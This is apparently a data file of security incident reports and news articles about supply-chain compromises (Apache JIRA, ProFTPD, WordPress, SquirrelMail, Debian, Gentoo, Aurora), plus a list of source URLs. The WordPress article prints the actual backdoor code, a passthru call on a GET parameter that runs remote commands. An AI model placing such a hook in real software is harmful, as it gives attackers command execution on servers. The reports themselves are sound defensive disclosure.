is a GPG key, not a PGP one sig=`rpm -q --qf %{SIGGPG:pgpsig} $package` if [ -z $sig ] ; then echo $package does not have a signature!!! fi fi done Unfortunately there is no known way of verifying this on Debian-based systems. 4. To replace a package that you find suspect, uninstall it and install it anew from your distro. For example, if you want to reinstall the ssh daemon, you would do: $ /etc/init.d/sshd stop rpm -e openssh zypper install openssh # for openSUSE based systems yum install openssh # for Fedora based systems Ideally do this from a live cdrom boot, using the rpm --root option to point rpm at the correct location. 5. From a liveCD environment, look for traces such as: a. Rogue startup scripts in /etc/rc*.d and equivalent directories. b. Strange directories in /usr/share that do not belong to a package. This can be checked on an rpm system with the following bash snippet: for file in `find /usr/share/`; do package=`rpm -qf -- ${file} | grep is not owned` if [ -n $package ] ; then echo weird file ${file}, please check this out fi done 6. Look for mysterious log messages, such as: a. Unexpected logins in wtmp and /var/log/secure*, quite possibly from legitimate users from unexpected hosts. b. Any program trying to touch /dev/mem. c. References to strange (non-text) ssh version strings in /var/log/secure*. These do not necessarily indicate *successful* breakins, but they indicate *attempted* breakins which means your system or IP address has been targeted. 7. If any of the above steps show possible signs of compromise, you should investigate further and identify the actual cause. If it becomes clear that the system has indeed been compromised, you should certainly reinstall the system from the beginning, and change your credentials on all machines that this machine would have had access to, or which you connected to through this machine. You will need to check your other systems carefully, and you should almost certainly notify the administrators of other systems to which you have access. Finally, please note that these hints are not guaranteed to turn up signs of a compromised systems. There are a lot of attackers out there; some of them are rather more sophisticated than others. You should always be on the alert for any sort of unexpected behavior from the systems you work with. thanks, greg k-h"
article62 = "Published on None. apache.org incident report for 04092010Posted on: 2010-04-13 05:04:50+00:00Apache.org services recently suffered a direct, targeted attack against our infrastructure, specifically the server hosting our issue-tracking software.The Apache Software Foundation uses a donated instance of Atlassian JIRA as an issue tracker for our projects. Among other projects, the ASF Infrastructure Team uses it to track issues and requests. Our JIRA instance was hosted on brutus.apache.org, a machine running Ubuntu Linux 8.04 LTS.Password SecurityIf you are a user of the Apache hosted JIRA, Bugzilla, or Confluence, a hashed copy of your password has been compromised.JIRA and Confluence both use a SHA-512 hash, but without a random salt. We believe the risk to simple passwords based on dictionary words is quite high, and most users should rotate their passwords.Bugzilla uses a SHA-256, including a random salt. The risk for most users is low to moderate, since pre-built password dictionaries are not effective, but we recommend users should still remove these passwords from use.In addition, if you logged into the Apache JIRA instance between April 6th and April 9th, you should consider the password as compromised, because the attackers changed the login form to log them.What Happened?On April 5th, the attackers via a compromised Slicehost server opened a new issue, INFRA-2591. This issue contained the following text:ive got this error while browsing some projects in jira http://tinyurl.com/XXXXXXXXX [obscured]Tinyurl is a URL redirection and shortening tool. This specific URL redirected back to the Apache instance of JIRA, at a special URL containing a cross site scripting (XSS) attack. The attack was crafted to steal the session cookie from the user logged-in to JIRA. When this issue was opened against the Infrastructure team, several of our administators clicked on the link. This compromised their sessions, including their JIRA administrator rights.At the same time as the XSS attack, the attackers started a brute force attack against the JIRA login.jsp, attempting hundreds of thousands of password combinations.On April 6th, one of these methods was successful. Having gained administrator privileges on a JIRA account, the attackers used this account to disable notifications for a project, and to change the path used to upload attachments. The path they chose was configured to run JSP files, and was writable by the JIRA user. They then created several new issues and uploaded attachments to them. One of these attachments was a JSP file that was used to browse and copy the filesystem. The attackers used this access to create copies of many users home directories and various files. They also uploaded other JSP files that gave them backdoor access to the system using the account that JIRA runs under.By the morning of April 9th, the attackers had installed a JAR file that would collect all passwords on login and save them. They then sent password reset mails from JIRA to members of the Apache Infrastructure team. These team members, thinking that JIRA had encountered an innocent bug, logged in using the temporary password sent in the mail, then changed the passwords on their accounts back to their usual passwords.One of these passwords happened to be the same as the password to a local user account on brutus.apache.org, and this local user account had full sudo access. The attackers were thereby able to login to brutus.apache.org, and gain full root access to the machine. This machine hosted the Apache installs of JIRA, Confluence, and Bugzilla.Once they had root on brutus.apache.org, the attackers found that several users had cached Subversion authentication credentials, and used these passwords to log in to minotaur.apache.org (aka people.apache.org), our main shell server. On minotaur, they were unable to escalate privileges with the compromised accounts.About 6 hours after they started resetting passwords, we noticed the attackers and began shutting down services. We notified Atlassian of the previously unreported XSS attack in JIRA and contacted SliceHost. Atlassian was responsive. Unfortunately, SliceHost did nothing and 2 days later, the very same virtual host (slice) attacked Atlassian directly.We started moving services to a different machine, thor.apache.org. The attackers had root access on brutus.apache.org for several hours, and we could no longer trust the operating system on the original machine.By April 10th, JIRA and Bugzilla were back online.On April 13th, Atlassian provided a patch for JIRA to prevent the XSS attack. See JRA-20994 and JRA-20995 for details.Our Confluence wiki remains offline at this time. We are working to restore it.What worked?Limited use passwords, especially one-time passwords, were a real lifesaver. If JIRA passwords had been shared with other services/hosts, the attackers could have caused widespread damage to the ASFs infrastructure. Fortunately, in this case, the damage was limited to rooting a single host.Service isolation worked with mixed results. The attackers must be presumed to have copies of our Confluence and Bugzilla databases, as well as our JIRA database, at this point. These databases include hashes of all passwords used on those systems. However, other services and hosts, including LDAP, were largely unaffected.What didnt work?The primary problem with our JIRA install is that the JIRA daemon runs as the user who installed JIRA. In this case, it runs as a jira role-account. There are historical reasons for this decision, but with 20/20 hindsight, and in light of the security issues at stake, we expect to revisit the decision!The same password should not have been used for a JIRA account as was used for sudo access on the host machine.Inconsistent application of one time passwords; We required them on other machines, but not on brutus. PAM was configured to allow optional use of OPIE, but not all of our sudoers had switched to it.SSH passwords should not have been enabled for login over the Internet. Although the Infrastructure Team had attempted to configure the sshd daemon to disable password-based logins, having UsePAM yes set meant that password-based logins were still possible.set meant that password-based logins were still possible. We use Fail2Ban for many services, but we did not have it configured to track JIRA login failures.What are we changing?We have remedied the JIRA installation issues with our reinstall. JIRA is now installed by root and runs as a separate daemon with limited privileges.For the time being we are running JIRA in a httpd-tomcat proxy config with the following rules: <pre> ProxyPass /jira/secure/popups/colorpicker.jsp ! ProxyPass /jira/secure/popups/grouppicker.jsp ! ProxyPass /jira/secure/popups/userpicker.jsp ! ProxyPass /jira http://127.0.0.1:18080/jira Sysadmins may find this useful to secure their JIRA installation until an upgrade is feasible. </li> <li>We will be making one-time-passwords mandatory for all super-users, on all of our Linux and FreeBSD hosts.</li> <li>We have disabled caching of svn passwords, and removed all currently cached svn passwords across all hosts ast the ASF via the global config <code>/etc/subversion/config</code> file: <pre> [auth] store-passwords = noSysadmins may find this useful to secure their JIRA installation until an upgrade is feasible. Use Fail2Ban to protect web application login failures from brute force attacksWe hope our disclosure has been as open as possible and true to the ASF spirit. Hopefully others can learn from our mistakes."
article63 = "Published on 2010-03-04 04:05:01+00:00.  Hackers who breached Google and other companies in January targeted source-code management systems, security firm McAfee asserted Wednesday. They manipulated a little-known trove of security flaws that would allow easy unauthorized access to the intellectual property the system is meant to protect. The software-management systems, widely used at businesses unaware that the holes exist, were exploited by the Aurora hackers in a way that would have enabled them to siphon source code, as well as modify it to make customers of the software vulnerable to attack. Its akin to making yourself a set of keys in advance for locks that are going to be sold far and wide. A white paper released by security firm McAfee during this weeks RSA security conference in San Francisco provides a couple of new details about the  Operation Aurora attacks  (.pdf) that affected 34 U.S. companies, including Google and Adobe, beginning last July. McAfee helped Adobe investigate the attack on its system and provided information to Google about malware used in the attacks. According to the paper, the hackers gained access to software-configuration management systems (SCM), which could have allowed them to steal proprietary source code or surreptitiously make changes to the code that could seep undetected into commercial versions of the companys product. Stealing the code would allow attackers to examine the source code for vulnerabilities, in order to develop exploits to attack customers who use the software, such as Adobe Reader, for example. [The SCMs] were wide open, says Dmitri Alperovitch, McAfees vice president for threat research. No one ever thought about securing them, yet these were the crown jewels of most of these companies in many ways — much more valuable than any financial or personally identifiable data that they may have and spend so much time and effort protecting. Many of the companies that were attacked used the same source-code management system made by  Perforce , a California-based company that makes products used by many large companies. McAfees white paper focuses on the insecurities in the Perforce system and provides suggestions for securing it, but McAfee said it will look at other source-code management systems in the future. The paper doesnt indicate which companies were using Perforce or had vulnerable configurations installed. As previously reported, the attackers gained initial access by conducting a spear-phishing attack against specific targets within the company. The targets received an e-mail or instant message that appeared to come from someone they knew and trusted. The communication contained a link to a website hosted in Taiwan that downloaded and executed a malicious JavaScript, with a zero-day exploit that attacked a vulnerability in the users Internet Explorer browser. A binary disguised as a JPEG file then downloaded to the users system and opened a backdoor onto the computer and set up a connection to the attackers command-and-control servers, also hosted in Taiwan. From that initial access point, the attackers obtained access to the source-code management system or burrowed deeper into the corporate network to gain a persistent hold. According to the paper, many SCMs are not secured out of the box and also do not maintain sufficient logs to help forensic investigators examining an attack. McAfee says it discovered numerous design and implementation flaws in SCMs. Additionally, due to the open nature of most SCM systems today, much of the source code it is built to protect can be copied and managed on the endpoint developer system, the paper states. It is quite common to have developers copy source code files to their local systems, edit them locally, and then check them back into the source code tree.... As a result, attackers often dont even need to target and hack the backend SCM systems; they can simply target the individual developer systems to harvest large amounts of source code rather quickly. Alperovitch told Threat Level his company has seen no evidence yet to indicate that source code at any of the hacked companies had been altered. But he said the only way to determine this would be to compare the software against backup versions saved over the last six months to when the attacks are believed to have begun. Thats an extremely laborious process, particularly when you are dealing with massive projects with millions of lines of code, Alperovitch said. Among the vulnerabilities found in Perforce: Perforce runs its software as system under Windows, giving malware the ability to inject itself into system-level processes and providing an attacker access to all administrative functions on the system. Although the Perforce documentation for UNIX tells the reader not to run the server service as root, it doesnt suggest making the same alteration to the Windows service. As a result, the default installation on Windows runs as a local system, or as root. By default, unauthenticated anonymous users are allowed to create users in Perforce, and no user password is required to create a user. All information, including source code, that is communicated between the client system and the Perforce server is unencrypted and therefore easily sniffed and compromised by someone on the network. The Perforce tools use weak authentication, allowing any user to replay a request with a cookie value that is easy to guess and obtain authenticated access to the system to perform powerful operations on the Perforce server. The Perforce client and server store all files in cleartext, allowing easy compromise of all the code in the local cache or on the server. The paper lists a number of additional vulnerabilities."
article64 = "Published on None. The open-source ProFTPD project has been hacked by unknown attackers who planted a backdoor in the source code.As a result of the hack, the projects main FTP server, as well as all of the mirror servers, have carried compromised versions of the ProFTPD1.3.3c source code, from the November 28 2010 to December 2 2010.ProFTPD, which positions itself as a secure FTP server for Linux and Unix based operating system, urged all users who run versions of ProFTPD which were downloaded and compiled in this time window to check their systems for security compromises and install unmodified versions of ProFTPD.Heres the skinny on the attack:On Sunday, the 28th of November 2010 around 20:00 UTC the main distribution server of the ProFTPD project was compromised. The attackers most likely used an unpatched security issue in the FTP daemon to gain access to the server and used their privileges to replace the source files for ProFTPD 1.3.3c with a version which contained a backdoor.The fact that the server acted as the main FTP site for the ProFTPD project (ftp.proftpd.org) as well as the rsync distribution server (rsync.proftpd.org) for all ProFTPD mirror servers means that anyone who downloaded ProFTPD 1.3.3c from one of the official mirrors from 2010-11-28 to 2010-12-02 will most likely be affected by the problem.ProFTPD said the backdoor introduced by the attackers allows unauthenticated users remote root access to systems which run the maliciously modified version of the ProFTPD daemon."
article65 = "Published on None. The backdooring of WordPressa state-of-the-art semantic personal publishing platform with a focus on aesthetics, web standards, and usability.WordPress is, according to its web site,  In other words, it is yet another weblog platform written in PHP. Like many such platforms, it has a fairly long history of security issues. Even so, the code samples featured in this ifsecure advisory are on the extreme side. One example:function get_theme_mcommand($mcds) { passthru($mcds); } /* ... */ if ($_GET[iz]) { get_theme_mcommand($_GET[iz]); }Needless to say, code like this is not a programming error - it is a deliberate backdoor. The project responded quickly, replacing the compromised 2.1.1 release with a fixed 2.1.2 and sending out an advisory. Even so, there are probably sites which installed the 2.1.1 release (which appears to have been distributed with the backdoor for about one week) and which are still vulnerable.It would be nice if the project would make a little more information available. As others have noted, there are no checksums of good or compromised versions of the software. We also know nothing about how the code was compromised in the first place, beyond this:It was determined that a cracker had gained user-level access to one of the servers that powers wordpress.org, and had used that access to modify the download file.Inquiring minds want to know how this could have come about; is there a separate WordPress vulnerability which still needs to be fixed? What steps have been taken to ensure that this sort of security breach cannot happen to future WordPress releases? The insertion of backdoors into services which are directly exposed to the Internet is a scary business; anybody who is running WordPress should be asking the project some serious questions to convince themselves that they will not have to go through this again. Your editor searched in vain for any such discussion in the WordPress forums.In one sense, WordPress users can consider themselves lucky: the code implementing the backdoor was so crude that it had little chance of escaping detection for long. Had the backdoor code been more subtle, it could well have survived for much longer. One assumes that the WordPress developers are auditing their code, looking for holes inserted with more care. But if they are, they are not talking about it.In general, backdoors are a frightening prospect for free software developers to ponder. The relatively open nature of many projects must provide a tempting target for scheming crackers, and it is not that hard to imagine that a good-enough developer could manage to code a backdoor in a sufficiently obscure manner that it gets through the review process without being detected. There may well be a project distributing such code now.That said, a quick look at the (relatively thin) history of compromised free software distributions shows that the normal contribution process is not the preferred way to insert backdoors. Instead, crackers seem to focus on breaking into servers and modifying code there. We can count ourselves fortunate; such attacks are easier to detect and recover from.The real lesson from this episode, as from the ones that came before, is that there is a real incentive for crackers to insert malware into free software distributions. (Clearly, the same incentive exists for proprietary software, but that does not concern us here). Any project which is distributing code with any security considerations at all (and that is most code) needs to think about this threat. If your processes - or your servers - are vulnerable to attack, it may be your project which finds its way into the headlines for the wrong reasons."
article66 = "Published on None. The backdooring of SquirrelMailBenefits for LWN subscribers The primary benefit from subscribing to LWN is helping to keep us publishing, but, beyond that, subscribers get immediate access to all site content and access to a number of extra site features. Please sign up today!SquirrelMail advertises itself as webmail for nuts. It is a PHP-based package which is in wide use; most distributions include a SquirrelMail package. Security problems in SquirrelMail are certainly not unheard-of; even so, the announcement that the source distribution for version 1.4.12 had been compromised raised some eyebrows. Initially the project downplayed the problem:Further investigations show that the modifications to the code should have little to no impact at this time. Modifications seemed to be based around a PHP global variable which we cannot track down. The changes made will most likely generate an error, rather than a compromise of a system in the event the code does get executed.It only took one day, though, before Uwe Schindler pointed out that, in fact, the changes made to the source opened a remote-execution back door into deployed SquirrelMail systems. Somewhere along the way, the project discovered that the 1.4.11 release had also been tampered with. The SquirrelMail developers released version 1.4.13 to close the vulnerabilities.There have not been any public reports of systems being compromised by way of this vulnerability. Additionally, it would appear that all of the distributors which shipped the affected versions got their version of the code prior to the attack. So the episode would appear to have ended reasonably well - as far as we know. There are some lessons that one can take from this attack, though.The downplaying of the problem initially was a potentially fatal mistake. If somebody has been tampering with the sources, there is no excuse not to go into red-alert mode immediately, even if the developers involved do not understand the attack. When a project has been compromised at such a fundamental level, one must assume the worst.The compromise was discovered after a user noticed that the tarballs on the download site did not match the posted MD5 checksums. Your editor suspects that very few of us actually verify checksums in the packages they take from the net. Doing so more often would be a good exercise in software hygiene for all of us.That said, the project got lucky this time around. A smarter attacker would have replaced the checksums after adding the back door, making the changes harder to detect. Longer-term, the increasing doubts about the security of MD5 suggest that relying on it to detect changes to tarballs might not be entirely safe. Far better to use public-key signatures; they should have a longer shelf life, and, if the keys are managed properly, they are impossible to replace. It seems that the project has posted GPG signatures for 1.4.13, though the Wayback Machine suggests that this is a recent practice. Your editor was unable to find the public key needed to verify the signatures.The modifications to the tarballs were done using a compromised developers account. The specific changes made were not put into the SquirrelMail source repository. The project has said nothing, though, about what has been done to ensure that no other changes were made there. Some sort of statement from the project along these lines would be most reassuring to SquirrelMails users.Perhaps the most encouraging conclusion, though, is this: there have been several attempts to compromise source distributions over the years. Many of them have succeeded in getting bad code into high-profile packages. But none of these attacks - so far as we know - have escaped detection for any significant period of time, and none of them have led to any sort of wide-scale exploit. As a whole, we would appear to be reasonably resistant to this kind of attack, even when the front-line defenses fail. With luck, and continued vigilance, that trend will continue. Both will be required, though: there is no doubt that the attackers will keep trying."
article67 = "Published on None. 2 GENTOO LINUX SECURITY ANNOUNCEMENT 200312-016 summary: rsync.gentoo.org rotation server compromised7 severity: normal9 CVE: None10 exploit: remote14 On December 2nd at approximately 03:45 UTC, one of the servers that makes up15 the rsync.gentoo.org rotation was compromised via a remote exploit. At this16 point, we are still performing forensic analysis. However, the compromised17 system had both an IDS and a file integrity checker installed and we have a18 very detailed forensic trail of what happened once the box was breached, so19 weare reasonably confident that the portage tree stored on that box22 The attacker appears to have installed a rootkit and modified/deleted some23 files to cover their tracks, but left the server otherwise untouched. The box24 was in a compromised state for approximately one hour before it was25 discovered and shut down. During this time, approximately 20 users26 synchronized against the portage mirror stored on this box. The method used27 to gain access to the box remotely is still under investigation. We will28 release more details once we have ascertained the cause of the remote31 This box is not an official Gentoo infrastructure box and is instead donated32 by a sponsor. The box provides other services as well and the sponsor has33 requested that we not publicly identify the box at this time. Because the34 Gentoo part of this box appears to be unaffected by this exploit, we are35 currently honoring the sponsors request. That said, if at any point, we36 determine that any file in the portage tree was modified in any way, we will37 release full details about the compromised server.41 Again, based on the forensic analysis done so far, we are reasonably42 confident that no files within the Portage tree on the box were affected.43 However, the server has been removed from all rsync.*.gentoo.org rotations44 and will remain so until the forensic analysis has been completed and the box45 has been wiped and rebuilt. Thus, users preferring an extra level of security46 may ensure that they have a correct and accurate portage tree by running:48 emerge sync50 Which will perform a sync against another server and ensure that all files"
article68 = "Published on None. Debian Investigation Report after Server CompromisesDecember 2nd, 2003The Debian administration team and security experts are finally able to pinpoint the method used to break-in into four project machines. However, the person who did this has not yet been uncovered.The package archives were not altered by the intruder.The Debian administration and security teams have checked these archives (security, us, non-us) quite early on in the investigation and re-installation process. Thats why the project was able to open up the security archive again and confirm that the stable update (3.0r2) wasnt compromised.If the project had anticipated to get compromised at the same time the stable update was implemented, the involved people would have postponed it. However, the updated packages were already installed in the stable archive and mirror servers at the time the break-ins were discovered, so it wasnt possible to hold it back anymore.Several methods based on different control data were used to verify the packages and to ensure that the archives werent altered by the attacker:externally stored lists of MD5 sums accumulated over the past weeks on not compromised machinesdigitally signed .changes files from external debian-devel-changes archives on not compromised machinesdigitally signed .changes files on the respective archive serversexternally stored mirror log filesTimelineBelow is the timeline of discovery and recovery of the compromised machines. All times are in UTC. Some times are only estimates since our conversation did not contain exact timestamps.Sep 28 01:33 Linus Torvalds releases 2.6.0-test6 with do_brk() fixOct 02 05:18 Marcelo Tosatti applies do_brk() boundary checkNov 19 17:00 Attacker logs into klecker with sniffed passwordNov 19 17:08 Root-kit installed on kleckerNov 19 17:20 Attacker logs into master with same sniffed passwordNov 19 17:47 Root-kit installed on masterNov 19 18:30 Attacker logs into murphy with service account from masterNov 19 18:35 Root-kit installed on murphyNov 19 19:25 Oopses on murphy startNov 20 05:38 Oopses on master startNov 20 20:00 Discovery of Oopses on master and murphyNov 20 20:54 Root-kit installed on gluckNov 20 22:00 Confirmation that debian.org was compromisedNov 21 00:00 Deactivation of all accountsNov 21 00:34 Shut down security.debian.orgNov 21 04:00 Shut down gluck (www, cvs, people, ddtp)Nov 21 08:30 Point www.debian.org to www.de.debian.orgNov 21 10:45 Public announcementNov 21 16:47 Developer information updatedNov 21 17:10 Shut down murphy (lists) and masterNov 22 02:41 security.debian.org is back onlineNov 25 07:40 lists.debian.org is back onlineNov 28 22:39 Linux 2.4.23 releasedDiscoveryOn the evening (GMT) of Thursday, November 20th, the admin team noticed several kernel oopses on master. Since that system was running without problems for a long time, the system was about to be taken into maintenance for deeper investigation of potential hardware problems. However, at the same time, a second machine, murphy, was experiencing exactly the same problems, which made the admins suspicious.Also, klecker, murphy and gluck have Advanced Intrusion Detection Environment (package aide) installed to monitor filesystem changes and at around the same time it started warning that /sbin/init had been replaced and that the mtime and ctime values for /usr/lib/locale/en_US had changed.Further investigation revealed the cause for both these problems to be the SucKIT root-kit (1.3b). It includes password sniffing and detection evasion capabilities (i.e. tools to hide processes and files) which are installed directly into the kernel, which in turn caused the oopses that were noticed.Detailed Attack AnalysisOn Wednesday, November 19th, at approximately 5pm GMT, a sniffed password was used to log into an unprivileged developer account on the host klecker (.debian.org). The attacker then retrieved the source code through HTTP for an (at that time) unknown local kernel exploit and gained root permissions via this exploit. Afterwards, the SucKIT root-kit was installed.The same account and password data were then used to log into the machine master, to gain root permissions with the same exploit and also to install the SucKIT root-kit.The attacker then tried to get access to the host murphy with the same account. This failed because murphy is a restricted machine and its only purpose is to act as list server to which only a small subset of developers can log into. Since the initial login attempt didnt work the person used his root access on master to access an administrative account which was used for backup purposes and gained access to murphy as well. The SucKIT root-kit was installed on this host as well.On the next day the attacker used a password sniffed on master to log into gluck, get root there and also install the SucKIT root-kit.The forensic analysis revealed exact dates and times when the program /sbin/init was overwritten and the root-kit installed. The analysts also discovered the executable file which was used to gain root access on the machines, which was protected and obfuscated with Burneye. Upon unwrapping and disassembling the exploit, security experts discovered which kernel bug was utilised.An integer overflow in the brk system call was exploited to overwrite kernel memory (change page protection bits). By doing so the attacker gained full control about the kernel memory space and was able to alter any value in memory.Even though this kernel code was improved in September by Andrew Morton and copied into a recent pre-release kernels since October, the security implication of the improvement wasnt considered. Hence, no security advisories were issued by any vendor. However, after it was discovered to be used as a local root exploit the Common Vulnerabilities and Exposures project has assigned CAN-2003-0961 to this problem. It is fixed in Linux 2.4.23 which was released last weekend and in the Debian advisory DSA 403.Linux 2.2.x is not vulnerable to this exploit because boundary checking is done before. It is also believed that Sparc and PA-RISC kernels are not vulnerable since user and kernel addresses are stored in different address spaces on these architectures.Please understand that we cannot give away the used exploit to random people who we dont know. So please dont ask us about it.RecoveryAfter the machines were shut down, images of the compromised hard disks were created and stored on a separate machine. They were distributed to the people doing the forensic analysis. The three machines in the US (master, murphy, gluck) were reinstalled afterwards and their services re-instated one by one after investigation by the relevant service admin.On klecker, however, this was postponed for a scheduled maintenance so the security archive could be brought online again sooner than the other services. At that time we also didnt have console access to klecker, so recovery had to be done remotely. After a disk-image was made via serial console login to a local machine on a firewalled network connection, the root-kit was removed, the kernel exchanged and hardened, binaries double-checked and the security archive verified against several different external sources. This machine will be re-installed in the next few weeks.As a security precaution all developer accounts were disabled in LDAP and SSH keys removed on the more important machines, so that no more machines could be compromised. This, however, effectively disabled just about any public Debian work that involved uploading files and accessing the CVS repositories.All passwords used on quantz (i.e. all Alioth, arch and subversion passwords) have been invalidated as well. All SSH authorized keys have been removed as well. Please use the lost password system to receive a new password.When all services are running again and the machines are sufficiently secured, LDAP will be reset so that developers can create a new password again. It cant currently be predicted when this will happen, though.Upon recovery SSH was re-installed on the compromised machines. Hence, there are new RSA host keys and key fingerprints for these hosts. The keys will be included in LDAP as soon as they are created and can be taken from here.ConsequencesRenew your passwords!Since passwords were sniffed on the compromised hosts, any outgoing connection that involved a password is to be considered compromised as well, i.e. the password should be considered known to the attacker. It should therefore be changed immediately.Additionally, if somebody had access to a Debian machine and was using the same password or passphrase on other machines or keys we strongly advise to change the password or passphrase respectively as soon as possible.If an SSH key was generated or stored on one of these machines and was used to log into other machines (i.e. by installing it in .ssh/authorized_keys ), it should be removed as well.The secret GnuPG/PGP keys which were found on debian.org machines were also removed from the Debian keyrings and thus deactivated.Developers who are worried about their own machines should at least run chkrootkit and watch its output. Matt Taggart maintains a backport of the current version for woody at the following address:deb http://lackof.org/taggart/debian woody/chkrootkit maindeb-src http://lackof.org/taggart/debian woody/chkrootkit mainAdditionally, a detailed list of precaution issues is provided by Wichert Akkerman and Matt Taggart.SucKIT Root-KitSucKIT is a root-kit presented in Phrack issue 58, article 0x07 (Linux on-the-fly kernel patching without LKM, by sd & devik). This is a fully working root-kit that is loaded through /dev/kmem, i.e. it does not need a kernel with support for loadable kernel modules. It provides a password protected remote access connect-back shell initiated by a spoofed packet (bypassing most firewall configurations), and can hide processes, files and connections.Usually, SucKIT is launched as /sbin/init at system bootup, forks to install itself into the kernel, start up a backdoor, and launches a copy of the original init binary from the parent (with pid 1). Any subsequent executions of /sbin/init are redirected to the original init.TESOs Burneye ProtectionBurneye is a means of obfuscating ELF binaries on the UNIX platform presented in Phrack issue 58, article 0x05 (Armouring the ELF: Binary encryption on the UNIX platform, by grugq & scut). Using tools like TESOs Burneye, an attacker can alter an executable program to encrypt its true purpose, hiding it from firewall filters, intrusion detection systems, anti-virus software and the prying eyes of investigators.ThanksJames Troup and Ryan Murray for their general work on all hostsAdam Heath and Brian Wolfe for their work on master and murphyWichert Akkerman for his work on kleckerDann Frazier and Matt Taggart for their work on gluckMichael Stone and Robert van der Meulen for their forensics workMarcus Meissner for disassembling the used exploitJaakko Niemi for his work on checking and re-enabling lists.debian.orgColin Watson for his work on checking and re-enabling bugs.debian.orgJosip Rodin for his work on checking and re-enabling the lists web archivesPress ResponseContact InformationFor further information, please visit the Debian web pages or send mail to press@debian.org."
article69 = "Published on None. Ken Thompson Really Did Launch His Trusting Trust Trojan Attack in Real Life September 27, 2022IntroductionUnix pioneer Ken Thompsons 1983 Turing Award acceptance speech popularized the now well-known concept of a Reflections on Trusting Trust-style backdoor, or in my words, a meta-backdoor. He argued that even a complete code audit cannot always ensure that a program is backdoor-free, since the development tools in the system can themselves be backdoored, and thus, implanting backdoors to the object code of a backdoor-free program.Whether Ken Thompson actually performed this attack in real life is a common subject of controversy in computer folklore. If one reads the original paper, one only finds a description of this attack as a thought experiment, leading one to conclude that any claim of a real-world attack by Thompson was an urban myth due to exaggeration.However, in 1995, Usenet poster Jay Ashworth, citing personal communications with Ken Thompson, provided strong evidence of the existence of a real-world experiment of this attack. Unfortunately, the full Usenet message is missing on the web. There are only quoted snippets of this Usenet post circulated around various blogs, reducing its authenticity.In 2021, Ive rediscovered the full Usenet message after a search effort in multiple Usenet archives. My success was partial - it was still a repost by someone else, and I was unable to find the original message. However, this repost contains the full Usenet message, including complete headers and message body, with the poster name and its Message-ID , establishing the authenticity of the post beyond reasonable doubts.Historians with a higher standard of proof may contact the poster in person, and the confirmation would be trivial. The poster of this message was Jay R. Ashworth, apparently well-involved in tech and was the author of RFC 2100.In conclusion, Ken Thompsons Trusting Trust compiler Trojan attack is not just a thought experiment. In fact, it was actually what he really did in real life. In a 1995 mail, he said he was able to successfully compromise the Unix Support Group at Bell Labs (precursor to Unix System Laboratories).Usenet postFor history preservation, hereby, Ive attached the full Usenet message."


# article1 = 'https://www.bleepingcomputer.com/news/security/check-your-gems-rubygems-fixes-unauthorized-package-takeover-bug/'
article2 = 'https://www.welivesecurity.com/2022/12/07/fantasy-new-agrius-wiper-supply-chain-attack/'
article3 = 'https://www.bleepingcomputer.com/news/security/docker-hub-repositories-hide-over-1-650-malicious-containers/'
# article4 = 'https://www.securityweek.com/supply-chain-attack-targets-customer-engagement-firm-comm100'
# article5 = 'https://www.bleepingcomputer.com/news/security/dropbox-discloses-breach-after-hacker-stole-130-github-repositories/'
# article6 = 'https://www.tomshardware.com/news/intel-confirms-6gb-alder-lake-bios-source-code-leak-new-details-emerge'
article7 = 'https://blog.sonarsource.com/php-supply-chain-attack-on-pear/'
article8 = 'https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/'
# article9 = 'https://www.revenera.com/blog/software-composition-analysis/the-story-behind-colors-js-and-faker-js/'
# article10 = 'https://zt.dev/posts/gcp-buildpacks-old-compiler/'
article11 = 'https://jetpack.com/2022/01/18/backdoor-found-in-themes-and-plugins-from-accesspress-themes/'
# article12 = 'https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html'
article20 = 'https://www.bleepingcomputer.com/news/security/heres-how-a-researcher-broke-into-microsoft-vs-codes-github/'
article44 = "https://blog.malwarebytes.com/threat-analysis/mac-threat-analysis/2017/05/handbrake-hacked-to-drop-new-variant-of-proton-malware/"
article47 = "https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"
article49 = "https://research.checkpoint.com/2017/expensivewall-dangerous-packed-malware-google-play-will-hit-wallet/"
article50 = "https://www.hackread.com/hackers-infect-mac-users-proton-malware-using-elmedia-player/"
article51 = "https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n"
article52 = "https://www.welivesecurity.com/2016/08/30/osxkeydnap-spreads-via-signed-transmission-application/"
# article56 = "https://www.theregister.co.uk/2015/09/21/xcodeghost_apple_ios_store_malware_zapped/"
# article60 = "https://lwn.net/Articles/602461/"
article64 = "https://www.zdnet.com/article/open-source-proftpd-hacked-backdoor-planted-in-source-code/"
article67 = "https://archives.gentoo.org/gentoo-announce/message/7b0581416ddd91522c14513cb789f17a"
article68 = "https://www.debian.org/News/2003/20031202"
article58 = "https://threatpost.com/hacker-puts-hosting-service-code-spaces-out-of-business/106761/"
article62 = "https://blogs.apache.org/infra/entry/apache_org_04_09_2010"
# A21articles = {'article11': article11, 'article12': article12}
article13 = "https://blog.sonatype.com/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware"
article19 = "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
article28 = "https://www.npmjs.com/advisories/1082"
article29 = "https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm"
article32 = "https://www.csoonline.com/article/3384259/asus-users-fall-victim-to-supply-chain-attack-through-backdoored-update.html"
article37 = "https://blog.trendmicro.com/trendlabs-security-intelligence/supply-chain-attack-operation-red-signature-targets-south-korean-organizations/"
article38 = "https://github.com/golang/go/issues/29230"
article40 = "https://wiki.gentoo.org/wiki/Project:Infrastructure/Incident_Reports/2018-06-28_Github"
article42 = "https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-discovered-in-pypi-repository-b66b8a534a8"
article43 = "https://blog.talosintelligence.com/2017/09/avast-distributes-malware.html"
article46 = "https://securityintelligence.com/news/typosquatting-attack-puts-developers-at-risk-from-infected-javascript-packages/"
article66 = "https://lwn.net/Articles/262688/"
article54 = "https://www.zdnet.com/article/linux-mint-website-hacked-malicious-backdoor-version/"

